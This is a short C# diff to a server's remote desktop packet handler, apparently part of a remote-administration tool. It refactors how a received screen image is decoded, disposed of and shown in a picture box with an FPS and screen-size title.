@@ -35,13 +35,14 @@ namespace Server.Handle_Packet
                         byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                         lock (RD.syncPicbox)
                         {
-                            Bitmap decoded = RD.decoder.DecodeData(new MemoryStream(RdpStream));
+                            using (MemoryStream stream = new MemoryStream(RdpStream))
+                                RD.GetImage = RD.decoder.DecodeData(stream);
 
-                            RD.pictureBox1.Image = decoded;
+                            RD.pictureBox1.Image = RD.GetImage;
                             RD.FPS++;
                             if (RD.sw.ElapsedMilliseconds >= 1000)
                             {
-                                RD.Text = "RemoteDesktop:" + client.ID + "    FPS:" + RD.FPS + "    Screen:" + decoded.Width + " x " + decoded.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
+                                RD.Text = "RemoteDesktop:" + client.ID + "    FPS:" + RD.FPS + "    Screen:" + RD.GetImage.Width + " x " + RD.GetImage.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
                                 RD.FPS = 0;
                                 RD.sw = Stopwatch.StartNew();
                             }
